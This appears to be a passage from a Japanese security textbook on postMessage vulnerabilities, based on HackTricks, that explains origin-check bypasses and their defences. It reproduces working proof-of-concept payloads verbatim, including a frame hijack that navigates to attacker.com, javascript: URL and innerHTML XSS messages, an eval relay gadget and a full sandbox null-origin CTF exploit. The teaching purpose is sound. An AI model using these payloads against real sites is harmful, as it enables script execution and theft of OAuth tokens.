# PostMessage の脆弱性 — クロスウィンドウ通信の落とし穴

> **この節で分かること**
> - `postMessage` の仕組みと、第2引数 `targetOrigin` が何を意味するのかを説明できる
> - 送信側の弱点（`targetOrigin='*'`）と受信側の弱点（`origin` 検証の不備）を区別して説明できる
> - `origin` 検証をすり抜ける代表的なバイパス手法を、脆弱なコードを見て診断できる
> - ページ内の `message` リスナーを列挙し、受信データが XSS のシンクへ届くかを追える
> - サンドボックス iframe の `null` origin、`e.source` の null 化、DOM クロバリングといった SOP バイパスの原理を説明できる
> - 送信側・受信側・framing の三方向から適切な防御を実装できる

**元資料**: https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html （原典取得済み。ただし本体ホストは取得環境の egress ポリシーで 403 のため、HackTricks が生成元にしている GitHub raw の同一 Markdown 原文から取得。MDN・OWASP・terjanq の一次資料も GitHub raw ミラーから取得済み）
**関連する節**: DOM ベース XSS、Prototype Pollution、同一オリジンポリシー（SOP）

---

## 1. なぜ postMessage が存在するのか

### 同一オリジンポリシーという壁

ブラウザには**同一オリジンポリシー**（Same-Origin Policy, SOP）という基本ルールがある。SOP とは、あるオリジン（scheme・ホスト名・ポートの3点組）のページが、別オリジンのページの中身を勝手に読み書きできないようにする仕組みのこと。たとえば `https://bank.example` のページが、同じタブに開いた `https://evil.example` のフレームの内容を読めてしまっては困る。SOP はこれを禁止する。

しかし現実の Web では、異なるオリジンのウィンドウどうしが**わざと**通信したい場面がある。決済フォームを別オリジンの iframe で埋め込む、OAuth のログインをポップアップで開いて結果を親へ返す、解析タグが親ページの情報を受け取る、といったケースだ。

### 明示的で安全な「郵便受け」

そこで登場するのが `postMessage`（ポストメッセージ）である。`postMessage` とは、ウィンドウ・iframe・ポップアップといった**別々のウィンドウの間で、オリジンをまたいでメッセージを送るための API**のこと。SOP が「中身をのぞき見るのは禁止」とする一方で、`postMessage` は「決められた形でメッセージを渡すのはOK」という、安全な受け渡し口を提供する。

つまり設計意図はこうだ。**中身の直接アクセスは禁じつつ、明示的に送られたメッセージだけを届ける**。送る側は「どのオリジン宛てか」を指定でき、受け取る側は「どのオリジンから来たか」を確かめられる。この2つのチェックが正しく使われて初めて安全になる。裏を返せば、どちらかのチェックを怠ると脆弱性になる。本節はまさにその「怠りどころ」を体系的に扱う。

### 2つの軸で捉える

postMessage の脆弱性は、大きく2軸に分けると整理しやすい。

```
postMessage の脆弱性
├── 送信側の弱点   … targetOrigin を '*'（ワイルドカード）にして機密を漏らす
└── 受信側の弱点   … addEventListener('message', ...) の origin 検証が甘い
```

以下、この2軸を軸に、送信の仕組み → 受信の仕組み → 攻撃者がどこを突くか → どう守るか、の順で見ていく。

---

## 2. 送信側の仕組み — postMessage() と targetOrigin

### 基本の関数シグネチャ

メッセージは次の関数で送る。

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

3つの引数の意味は次のとおり。

| 引数 | 役割 |
|---|---|
| `message` | 送るデータ。構造化クローンされるので、文字列やオブジェクト、`ArrayBuffer` などを渡せる |
| `targetOrigin` | 配信先オリジンの制約。`'*'`（ワイルドカード）か、`https://company.com` のような**正確なオリジン**を指定する |
| `[transfer]` | 転送可能オブジェクト（Transferable）のリスト。任意 |

`transfer`（転送可能オブジェクト）とは、`ArrayBuffer` のようにコピーせず所有権ごと相手へ「移す」ことができるデータのこと。これは後の攻撃で少しだけ登場する。

### targetOrigin が配信を左右する

第2引数 `targetOrigin` は、この節で最も重要な概念だ。原文の定義を引く。

> `targetOrigin` can be `'*'` or an exact origin such as `https://company.com`. With an exact origin, the browser delivers the message only if the target window currently has that origin. With `'*'`, the message can be delivered regardless of the target window's current origin.

日本語にすると次のようになる。

- **正確なオリジン**（例 `https://company.com`）を指定した場合、対象ウィンドウが**現在まさにその origin を持っているときにだけ**、ブラウザはメッセージを配信する。
- **`'*'`**（ワイルドカード）を指定した場合、対象ウィンドウが現在どのオリジンにいようと配信されうる。

この違いが決定的だ。もし攻撃者が対象フレームを自分のオリジンへ navigate（別ページへ移動）させたあとで、送信側が `'*'` でメッセージを送れば、そのメッセージは**攻撃者オリジンに届いてしまう**。これが「窃取系」攻撃すべての前提条件になる。逆に正確なオリジンを指定していれば、フレームが攻撃者オリジンに移った時点で配信条件を満たさなくなり、漏れない。

### いろいろな送信方法（原文のコードそのまま）

原文には送り先別の送信方法がまとめられている。原文どおり載せる。

```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to a URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```

読みどころは次のとおり。

- ペイロード例 `{"__proto__":{"isAdmin":True}}` は、`__proto__` を汚染する **Prototype Pollution**（プロトタイプ汚染）を狙った JSON である。プロトタイプ汚染とは、JavaScript のオブジェクトが共有する「大元の設計図（プロトタイプ）」を書き換えて、全オブジェクトの挙動を変えてしまう攻撃のこと。§12 で詳しく扱う。
- ポップアップ内の iframe に送るには、`win.length == 1`（iframe がロードされる）になるまで**ループで待つ**必要がある。`win[0]` でポップアップ内の最初のフレームを参照する。
- `onload` を使えば、iframe がロードされた直後に `this.contentWindow.postMessage(...)` を送れる。

---

## 3. 送信側の脆弱性 — フレーム化と targetOrigin='*'

### 攻撃者はどこを突くか

原文の主張はこうだ。

> ページが**フレーム化可能**（有効な `X-Frame-Options` や CSP `frame-ancestors` 保護がない）で、かつワイルドカード `targetOrigin` で**機密メッセージ**を送っている場合、攻撃者は iframe を攻撃者制御のオリジンに navigate させ、そこでメッセージを受信できる。

「フレーム化可能」とは、そのページを攻撃者が自分のページの iframe に埋め込めてしまう状態のこと。`X-Frame-Options` や CSP の `frame-ancestors` という HTTP ヘッダで埋め込みを禁止していなければ、フレーム化可能である。

重要な制約が原文に明記されている。

> Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.

つまり、フレーム化できても `targetOrigin` がワイルドカードでなく URL 指定なら、このトリックは効かない。出典は Google VRP の「Hijacking your screenshots」（GeekyCat、archived）。

### iframe の origin を書き換えて奪う PoC

原文の PoC を原文どおり載せる。

```html
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000); //Wait 6s

      //Try to change the origin of the iframe each 100ms
      function exp(){
          setInterval(function(){
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```

動きを追う。6秒待ってから、100ミリ秒ごとに、ネストされたフレーム（`window.frames[0].frame[0][2]`）の `location` を攻撃者ページへ書き換え続ける。ワイルドカードで送信された機密メッセージが、書き換え後の攻撃者ドキュメントへ届く。フレームのインデックス（`[0][2]` のような添字）はドキュメントツリーの構造によって変わるので、実際の階層を確認する必要がある。この「子フレームの location を書き換えて奪う」手口は §11 で改めて詳しく扱う。

---

## 4. 受信側の入り口 — addEventListener('message')

### message イベントを受け取る

JavaScript は `addEventListener`（イベントリスナー登録）で `message` イベントを受けるハンドラを登録する。`addEventListener` とは、「あるイベントが起きたら、この関数を実行して」とブラウザに登録する仕組みのこと。典型的な受信コードは次のとおり。

```javascript
window.addEventListener(
  "message",
  (event) => {
    if (event.origin !== "http://example.org:8080") return

    // ...
  },
  false
)
```

このハンドラは、まず `event.origin`（送信元オリジン）をチェックし、期待するオリジンでなければ即座に `return` して処理を打ち切っている。これが正しい受信の基本形だ。

原文の指摘を訳す。パスワード変更などの機微な操作を受信データが駆動する場合、この origin チェックは**必須**である。**厳密な origin チェックがない**と、攻撃者は被害者ページに任意のメッセージデータをハンドラへ送りつけられる。

### なぜ origin 検証が要になるのか

`message` イベントは、iframe 階層の中の**どのウィンドウからでも**送れる。上位から下位まで、どのフレームも他のフレームへメッセージを送れてしまう。だから受信側は「誰から来たか」を必ず自分で確かめないと、`http://evil.example.com` のような悪意あるウィンドウからのメッセージと、正当なメッセージを区別できない。

この「origin 検証を、どうやって甘くしてしまうか」が、受信側脆弱性の中心テーマになる。次の §5 でまずリスナーを見つける方法を、§6 以降で検証の甘さを突く手法を見ていく。

---

## 5. リスナーの列挙（Enumeration）

### まずどこに message リスナーがあるか探す

攻撃・診断のどちらでも、最初にやることは「このページはどんな `message` リスナーを持っているか」を突き止めることだ。原文の方法をまとめる。

| 方法 | やり方 |
|---|---|
| JS コードを検索 | `window.addEventListener` と `$(window).on`（jQuery 版）を探す |
| コンソールで実行 | 開発者ツールのコンソールで `getEventListeners(window)` を実行する |
| DevTools の画面 | ブラウザ開発者ツールの **Elements → Event Listeners** を見る |
| ブラウザ拡張 | Posta または postMessage-tracker を使い、メッセージを傍受・表示する |

`getEventListeners(window)` は Chrome の DevTools コンソール限定の関数で、`window` に登録されたイベントリスナーの一覧を返す。ここに `message` があれば、そのハンドラ関数の中身を読める。

> ### 📌 ここは自分で開いて読んでください
> **資料**: HackTricks — PostMessage Vulnerabilities（本体ページ） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html
> **なぜ**: 本教科書の執筆環境からは本体ホスト（hacktricks.wiki）を自動取得できなかった（理由: サイト側の egress ポリシーで 403）。本文の文章は GitHub 上の同一原文 Markdown から取得したが、原文に貼られている `getEventListeners(window)` の実行結果と「Elements → Event Listeners」の**スクリーンショット2枚は画像なので本ノートには収録できていない**。
> **読みどころ**:
> 1. `getEventListeners(window)` の実行結果が実際どう表示されるか（返り値の構造）を目で確認するため。
> 2. DevTools「Elements → Event Listeners」パネルで message リスナーがどう見えるか、UI 上の位置を掴むため。
> 3. 各節末尾の相互リンク（Prototype Pollution / XSS ページ）と、更新があった場合の追記を追うため。
> **代替手段**: スクリーンショットの代わりに、自分の Chrome DevTools コンソールで `getEventListeners(window)` を実行すれば同じ表示を再現できる。列挙ツール（下記 Posta / postMessage-tracker）でも同等の情報が得られる。

### 列挙ツール

原文が挙げる2つのブラウザ拡張と、補完で回収したツール README の要点を表にまとめる。

| ツール | 作者 / 出自 | できること |
|---|---|---|
| **Posta** | enso.security 製 Chrome 拡張 | メイン origin と通信する iframe を一覧（Tabs）、origin↔iframe 間の全 postMessage トラフィックを検査（Messages）、元メッセージを改変して**リプレイ送信**（Console） |
| **postMessage-tracker** | Frans Rosén 作。OWASP AppSec EU 2018 で発表、2020年5月公開の Chrome 拡張 | 現在ウィンドウの listener 数インジケータ表示、全サブフレームの listener 追跡、**短命な/インタラクションで有効化される listener** も追跡、Raven/New Relic/Rollbar/Bugsnag/jQuery のラッパを "unpack" して実 listener を表示 |

Posta の Console 機能は、傍受した postMessage を改ざんして再送できるので、「このフィールドを変えるとどう挙動が変わるか」を手早く試せる。postMessage-tracker は、iframe 内で一瞬だけ有効になる隠れリスナーの発見に強い。

### recon の方法論（eventlistener-xss-recon）

補完で回収した `eventlistener-xss-recon`（yavolo 作）は、大量のホストから JS を集めて正規表現でリスナーを探す recon（偵察）方法論を示している。コマンド例は原文どおり。

```bash
cat hosts | getJS | grep target.com | httpx --match-regex "(?i)addEventListener\((?:'|\")message(?:'|\")"
cat hosts | hakrawler -plain | httpx --match-regex "(?i)addEventListener\((?:'|\")message(?:'|\")"
```

`grep target.com` は、よく保守されている公開 CDN を除外し、自前配信の `static.target.com` などにある**古いサードパーティ JS** を狙うためのフィルタである。古い JS は保守が甘く、脆弱なリスナーが残っていることが多い。

DevTools 側では、**Sources タブ → Global Listeners → message** で登録済み message リスナーを列挙できる。リスナーにブレークポイントを置き、コンソールから次を撃って、`if()` や正規表現のチェックを潜り抜けてシンクに到達するか観察する。

```javascript
window.postMessage('test','*')
```

Burp Suite の DOM Invader（内蔵ブラウザ）も同様の機能を持つ。recon 用の exploit テンプレートは原文どおり。

```html
<script>
var target = document.getElementById('target')
target.addEventListener('load', () => {
  target.contentWindow.postMessage({
    "type": "redacted",
    "data": "<script>alert(document.domain)<\/script>"}, '*')
})
target.src = "https://test.target.com/search?q=yavolo"
</script>
```

---

## 6. origin 検証バイパス集

ここが受信側脆弱性の心臓部だ。「origin をチェックしているつもり」の実装が、実は甘くて通り抜けられる、という代表パターンを順に見る。

### 6.1 event.isTrusted を認可に使う誤り

`event.isTrusted`（イベントが信頼できるか）は、そのイベントを**ブラウザがディスパッチした**（＝本物のイベント）のか、それとも JS が `dispatchEvent` で人工的に発火したのか、を区別するだけのフラグである。

原文の指摘を訳す。`event.isTrusted` は「ブラウザがイベントをディスパッチしたか」を示すだけで、`MessageEvent` が**信頼できる origin から来たことや、真正なユーザー操作から来たことを証明しない**。だから認可（誰からのメッセージを信じるか）の判断に使ってはならない。代わりに `event.origin`、必要なら `event.source` を検証する。出典は MDN の Event.isTrusted。

### 6.2 indexOf() による部分一致

次のような origin チェックはバイパスされる。脆弱な例（原文どおり）。

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

`indexOf` は「文字列の中にこの部分文字列が含まれるか」を先頭から探すだけである。だから `https://app-sj17.ma` を含んでいれば通ってしまい、`https://app-sj17.ma.attacker.com` のような攻撃者ドメインでもチェックを通過する。

### 6.3 String.prototype.search() の正規表現化

`search()`（`String.prototype.search()`）メソッドは、本来**正規表現**用であり文字列用ではない。正規表現でない文字列を渡すと、暗黙のうちに正規表現へ変換される。すると `.`（ドット）が「任意の1文字」を意味するワイルドカードとして働き、細工したドメインで検証をすり抜けられる。例（原文どおり）。

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

`www.s.fedomain.com` の `.` が任意1文字にマッチするので、`www.safedomain.com` にマッチしてしまう。

### 6.4 match() も同じ

`match()` も `search()` と同様に正規表現を処理する。正規表現の書き方が不適切（アンカーが無い、メタ文字をエスケープしていない等）だとバイパスされうる。

### 6.5 escapeHtml の上書き挙動

`escapeHtml` は、入力の危険な文字をエスケープしてサニタイズする意図の関数である。しかし原文が指摘する問題は、この関数が**新しいエスケープ済みオブジェクトを作らず、既存オブジェクトのプロパティを上書きする**設計になっている点だ。

制御下のプロパティが `hasOwnProperty` を持たないようにオブジェクトを細工できれば、`escapeHtml` は期待どおり動かない。原文の対比例を載せる。

期待どおりエスケープされる例（Expected Failure）。

```javascript
result = u({
  message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

エスケープを回避する例（Bypassing the escape）。

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

この文脈では **`File` オブジェクト**が特に悪用しやすい。`File` は読み取り専用の `name` プロパティを持つため、テンプレートで使われた際に `escapeHtml` でサニタイズされず、そのまま HTML に載ってセキュリティリスクになりうる。

### 6.6 document.domain の緩和

`document.domain` プロパティは、スクリプトからドメインを短縮設定できる。これにより、同一親ドメイン内での SOP を**より緩和**できてしまう。たとえば `a.example.com` と `b.example.com` が両方 `document.domain = "example.com"` に設定すると、互いに同一オリジン扱いになる。現代では非推奨だが、古い実装では origin 判定の抜け穴になる。

### 6.7 バイパス手法まとめ表

ここまでの手法を診断・防御の観点で表にする。

| 手法 | 何が起きるか | 悪い実装例 / トリガー | 対策 |
|---|---|---|---|
| `event.isTrusted` を認可に使用 | JS の `dispatchEvent` か否かしか示さず、信頼オリジン由来を証明しない | `if(!e.isTrusted) return` を origin 検証代わりに使う | `event.origin`（必要なら `event.source`）を検証 |
| `indexOf()` 部分一致 | 攻撃者ドメインに信頼文字列を含めれば通過 | `origin.indexOf("https://app-sj17.ma")` | 完全一致（`===`）またはホスト分解して比較 |
| `String.prototype.search()` | 引数が正規表現化され `.` がワイルドカード化 | `origin.search("www.s.fedomain.com")` | 正規表現を使わず厳密文字列比較 |
| `match()` | 正規表現の構造ミスでバイパス | 甘い正規表現 | アンカー付き厳密正規表現 or 完全一致 |
| `escapeHtml` の上書き挙動 | 既存オブジェクトのプロパティ上書き。`hasOwnProperty` を持たない／`File.name` は非サニタイズ | `u(new Error(...))`、`File` オブジェクト | サニタイズ後の新規オブジェクトを生成、テンプレートで読み取り専用プロパティを信頼しない |
| `document.domain` 緩和 | 同一親ドメイン内で SOP を緩和 | `document.domain="example.com"` | `document.domain` を使わない設計 |

> ### 📌 ここは自分で開いて読んでください
> **資料**: jlajara「DOM XSS via postMessage vol.2」 — https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `jlajara.gitlab.io`（GitLab Pages）が egress 403 でブロック。GitHub 側にソースミラーが無い。WebSearch 予算も枯渇していたため二次情報でも回収できず）。以下の記述は HackTricks 本文が要約した二次情報にもとづく。
> **読みどころ**:
> 1. `indexOf` / `search` / `match` / `startsWith` の誤用や URL 部分一致といった、**origin 検証の甘い実装 5 パターン**を、実在サイトを模した具体コードで見るため（本節 §6 の抽象説明を、手を動かす形で補完できる）。
> 2. postMessage の受信データが `location` / `innerHTML` / `eval` などのシンクへ届く、**段階的な DOM XSS PoC の組み立て手順**を追うため。
> 3. iframe や `window.open` を使った**ペイロード配送のタイミング制御**の実例を得るため。
> 4. 前編（Part 1、2020/07/09）と対で読むと、基礎から応用への流れが掴めるため。
> **代替手段**: 著者 Jorge Lajara（X: @Jorge_Lajara）の同名シリーズ Part 1 が同一ブログにあり内容が連続する。origin バイパスの分類自体は本節 §6 に要約収録済みなので、まず本節を読めば骨子は把握できる。

---

## 7. substring scheme チェックと javascript: URL

### 突きどころ

受信側が `event.origin` を検証せず、`event.data` に `http:` や `https:` が**含まれるか**だけを確認してから、その値を `location.href` に代入する実装がある。ここでの誤りは、「文字列に `http:` が含まれるか」を見ても、実際の URL スキーム（`javascript:` なのか `http:` なのか）を制約したことにはならない、という点だ。

攻撃者は値の**先頭を `javascript:`** にして、フィルタが要求する `http:` などのサブストリングを**JavaScript の行コメントの後ろ**に置けばよい。すると先頭は `javascript:` URL として実行され、しかも `indexOf('http:') > -1` フィルタも満たす。

### PoC（原文どおり）

```html
<iframe
  src="https://target.example/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

`javascript:print()//http:` を分解すると次のようになる。

```
javascript:print()   ← ブラウザが受信側オリジンで実行する JavaScript URL
//http:              ← JavaScript の行コメント。indexOf('http:') フィルタは満たすが実行はされない
```

原文によれば、悪用には次の3つが必要だ。(1) 対象ウィンドウへの参照（フレーム化可能なページかポップアップ）、(2) 攻撃者が到達できるリスナー、(3) `javascript:` URL を許す navigation シンク。出典は PortSwigger のラボと YesWeHack。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PortSwigger Web Security Academy Lab「DOM XSS using web messages and a JavaScript URL」 — https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `portswigger.net` が egress 403 でブロック）。手法自体は HackTricks 本文が解説済みで、本節 §7 に PoC を逐語収録している。
> **読みどころ**:
> 1. `javascript:print()//http:` による substring scheme バイパスを、**実際のラボ環境で手を動かして再現**し、`indexOf('http:')` フィルタを通す感覚を掴むため。
> 2. 同シリーズの他ラボ（"Web message" → `eval`、"Web message" → `document.write` など）で、**シンク別の分岐**を体系的に学ぶため。
> 3. 公式解法（exploit server から iframe で `postMessage('javascript:print()//http:','*')` を送る）を確認するため。
> **代替手段**: 本節 §7 にラボと同一の PoC（`onload="this.contentWindow.postMessage('javascript:print()//http:','*')"`）を逐語収録済み。ラボ環境が無くてもロジックは追える。

---

## 8. origin だけを信頼する設計は境界にならない

### 8.1 origin-only 信頼 + 信頼リレー

受信側が **`event.origin` だけ**をチェックしている場合（たとえば「任意の `*.trusted.com` なら信頼する」）、その信頼オリジン上に、攻撃者制御のパラメータを `postMessage` でそのまま転送する「リレー」ページを見つけられることが多い。

たとえば、クエリパラメータを受け取って `{msg_type, access_token, ...}` を `opener` や `parent` に転送するマーケティング/解析ガジェットがあるとする。攻撃の手口は次のとおり。

1. **opener を持つ形で被害者ページをポップアップ/iframe で開く**（多くの pixel/SDK は `window.opener` が存在するときだけリスナーを登録するため）。
2. **別の攻撃者ウィンドウを、信頼オリジン上のリレーエンドポイントに navigate** し、注入したいメッセージフィールド（メッセージ種別・トークン・nonce）を埋める。
3. メッセージは**信頼オリジンから**来るので origin-only 検証を通過し、被害者リスナー内で特権動作（状態変更・API 呼び出し・DOM 書き込み）を起動できる。

実際に観測された悪用パターンを原文から訳す。

- 解析 SDK（例: pixel/fbevents 系）は `FACEBOOK_IWL_BOOTSTRAP` のようなメッセージを消費し、**メッセージ内で供給されたトークンでバックエンド API を呼ぶ**。その際リクエストボディに `location.href` や `document.referrer` を含める。攻撃者が自分のトークンを供給すれば、**そのトークンのリクエスト履歴/ログでこれらのリクエストを読める**ため、被害者ページの URL や referrer に含まれる OAuth code/token を exfil（外部に持ち出し）できる。
- 任意フィールドを `postMessage` に反映するリレーは、特権リスナーが期待する**メッセージ種別を偽装**できる。弱い入力検証と組み合わせると Graph/REST 呼び出し、機能アンロック、CSRF 相当のフローに到達できる。

ハンティングのコツ（原文どおり訳）。`event.origin` だけをチェックする `postMessage` リスナーを列挙し、次に**同一オリジン上で URL パラメータを `postMessage` で転送する HTML/JS エンドポイント**（マーケプレビュー、ログインポップアップ、OAuth エラーページ）を探す。両者を `window.open()` + `postMessage` でつないで origin チェックを回避する。

### 8.2 信頼オリジンの allowlist は境界にならない

原文の核心的な主張はこうだ。厳密な `event.origin` チェックは、**信頼したオリジンが攻撃者 JS を実行できない**場合にのみ有効である。特権ページがサードパーティ iframe を埋め込み、`event.origin === "https://partner.com"` を安全だと仮定する場合、`partner.com` 上のどこかに XSS が1つでもあれば、それが親への橋渡しになる。

親（信頼ページ）側の脆弱なハンドラ（原文どおり）。

```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
  if (e.origin !== "https://partner.com") return
  const [type, html] = e.data.split("|")
  if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```

実際の攻撃パターンは3段階。

1. **partner iframe の XSS を悪用**し、リレーガジェットを仕込む。これで任意の `postMessage` が、信頼オリジン内でのコード実行になる。

```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```

2. **攻撃者ページから**、侵害した iframe へ JS を送り、許可されたメッセージ種別を親へ転送させる。メッセージは `partner.com` 由来なので allowlist を通過し、安全でなく挿入される HTML を運ぶ。

```javascript
postMessage({
  cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```

3. 親が攻撃者 HTML を挿入し、**親オリジン（例 `facebook.com`）での JS 実行**を許す。これで OAuth code を盗んだり、完全なアカウント乗っ取り（ATO）フローへ pivot できる。

原文の要点（Key takeaways）。

- **partner origin は境界ではない**。「信頼された」partner の任意 XSS で、攻撃者は `event.origin` チェックを回避する許可済みメッセージを送れる。
- **partner 制御ペイロードを描画**するハンドラ（特定メッセージ種別で `innerHTML` に流す）は、partner 侵害を same-origin DOM XSS に変える。
- 広い**メッセージ面**（多数の種別、構造検証なし）は、partner iframe 侵害後の pivot ガジェットを増やす。

---

## 9. SOP バイパス — null origin・e.source の null 化・DOM クロバリング

ここからは、origin や source の比較そのものを崩す一連の手法だ。いずれも「サンドボックス iframe が origin を `null` にする」という性質と、緩い比較（`==`）を軸にする。

### 9.1 e.origin == window.origin バイパス（null == null）

原文の説明を訳す。**サンドボックス iframe**（`sandbox` 属性を付けた iframe）を使ってページを埋め込む場合、その iframe の origin は `null` になる。サンドボックス iframe とは、`sandbox` 属性で機能を制限した iframe のこと。`allow-same-origin` を付けないと、中身の文書は「opaque origin（不透明なオリジン）」を持ち、メッセージング時のシリアライズ origin は `null` になる。

- `sandbox` に **`allow-popups`** を指定すると、その iframe から開いたポップアップは親 iframe のサンドボックス制約を**継承**する。つまり **`allow-popups-to-escape-sandbox`** を付けない限り、ポップアップの origin も `null` になり、iframe の origin と一致する。
- したがって、この条件下でポップアップを開き、iframe からポップアップへ `postMessage` を送ると、**送信側・受信側ともに origin が `null`** になる。結果、`e.origin == window.origin` が `null == null` で真と評価され、origin チェックを通過してしまう。

### 9.2 e.source のバイパス

メッセージが「スクリプトがリッスンしているのと同じウィンドウから来たか」を確かめるチェックもよく使われる。特にブラウザ拡張の Content Script が「同一ページから送られたか」を確認するのに使う。

```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
  return
}
```

原文によれば、`postMessage` を送る **iframe を作り、送信直後に削除**することで、メッセージの `e.source` を `null` に強制できる。送信元 iframe が消えると、受信側から見た `source` が `null` になるためだ。これで `e.source !== window` のようなチェックが、比較対象を失って崩れる。

### 9.3 子ページ A の実践 — soXSS チャレンジ

HackTricks の子ページ「Bypassing SOP with Iframes - 1」は、NDevTK と terjanq が作ったチャレンジを扱う。脆弱なハンドラは次のとおり（原文どおり）。

```javascript
const identifier = "4a600cd2d4f9aa1cfb5aa786"
onmessage = (e) => {
  const data = e.data
  if (e.origin !== window.origin && data.identifier !== identifier) return
  if (data.type === "render") {
    renderContainer.innerHTML = data.body
  }
}
```

注目すべきは検証条件だ。`e.origin !== window.origin && data.identifier !== identifier`。この式は**両方が真のときだけ** `return` する。つまり**どちらか一方を偽にすれば**通る。origin を一致させる（`null == null` を成立させる）か、`identifier` の値を知って一致させるかのどちらかでよい。通常フローは `data.body` を DOMPurify（HTML サニタイザー）でサニタイズするので、攻撃者制御 HTML を直接ここへ届けるには、この甘い検証をすり抜ける必要がある。

原文が示す SOP バイパスは2つ。

- **SOP bypass 1（e.origin === null）**: `allow-same-origin` を欠くサンドボックス iframe に埋め込まれた文書は opaque origin を受け取り、メッセージング時のシリアライズ origin が `null` になる。よって `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` でこの条件を強制できる。ページが埋め込み可能ならこの方法で保護をバイパスできる（cookie を `SameSite=None` に設定する必要もあるかもしれない）。
- **SOP bypass 2（window.origin === null）**: `allow-popups` が設定されていると、開いたポップアップは `allow-popups-to-escape-sandbox` も設定されない限りサンドボックス制約を継承する。したがって opaque-origin iframe からポップアップを開くと、ポップアップも opaque origin のままサンドボックスされる。

チャレンジ解法（原文どおり訳）。サンドボックス iframe を作り、それを使って `/iframe.php` をポップアップで開く。比較される両 origin 文字列が `null` になるため、攻撃者は unsafe な `innerHTML` 代入に届くペイロードを送れる。最初の XSS で `identifier` を取得し、2つ目の XSS ペイロードをトップページへ送り返す。トップページは `/iframe.php` へ navigate する。2回目の配送では、`identifier` を知っていることで `data.identifier === identifier` が真になり、送信元 origin が一致しなくても甘い検証の別条件を満たす。XSS が対象オリジンで実行される。

完全なペイロードとタイミング（原文どおり）。

```html
<body>
  <script>
    f = document.createElement("iframe")

    // Needed flags
    f.sandbox = "allow-scripts allow-popups allow-top-navigation"

    // Second communication with /iframe.php (this is the top page relocated)
    // This will execute the alert in the correct origin
    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
    },1000);`.replaceAll("\n", " ")

    // Initial communication
    // Open /iframe.php in a popup, both iframes and popup will have "null" as origin
    // Then, bypass window.origin === e.origin to steal the identifier and communicate
    // with the top with the second XSS payload
    f.srcdoc = `
    <h1>Click me!</h1>
    <script>
      onclick = e => {
        let w = open('https://so-xss.terjanq.me/iframe.php');
        onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
        setTimeout(_ => {
          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
        }, 1000);
      };
    <\/script>
    `
    document.body.appendChild(f)
  </script>
</body>
```

〔補足〕このチャレンジの背景を、terjanq の一次 writeup（`same-origin-xss`）から補う。チャレンジは (1) HTML ノート用テキスト入力、(2) textarea を iframe 内でレンダリングする2コンポーネントから成り、iframe は同一オリジンだが送信データは DOMPurify でサニタイズされる。`identifier` はユーザーのセッションに保存され、セッション cookie は `Lax`。単純な `<iframe sandbox="allow-scripts" src=...>` 方式は「ページが埋め込み可能かつ cookie が `SameSite=None`」のときだけ成立し、本チャレンジではそうでなかったため、`allow-popups` 継承を使う解法になった。ドメイン名（`so-xss.terjanq.me` など）はすべて CTF/デモ用の環境である。

### 9.4 子ページ B の実践 — DOM クロバリングで e.source と token を無効化

子ページ「Bypassing SOP with Iframes - 2」は、SekaiCTF 2022「obligatory-calc」の解法（@Strellic_）を扱う。バイパス対象のチェックは次（原文どおり）。

```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```

このチェックを崩せれば、HTML 入りの postMessage を送り、サニタイズなしで `innerHTML` に書かせて XSS になる。突破は2つのチェックに分かれる。

**第1チェックのバイパス**（`e.source == window.calc.contentWindow`）。狙いは `window.calc.contentWindow` を `undefined` にし、`e.source` を `null` にして、`null == undefined` を成立させること。

- `window.calc.contentWindow` は実質 `document.getElementById("calc")` である。この `document.getElementById` は **DOM クロバリング**で乗っ取れる。DOM クロバリングとは、`name` や `id` 属性を持つ HTML 要素を仕込んで、JavaScript のグローバルなプロパティや組み込み関数を上書きしてしまうテクニックのこと。
- 具体的には `<img name=getElementById /><div id=calc></div>` を注入すると、`document.getElementById` が `<img>` 要素に置き換わり、`window.calc` が `undefined` になる。
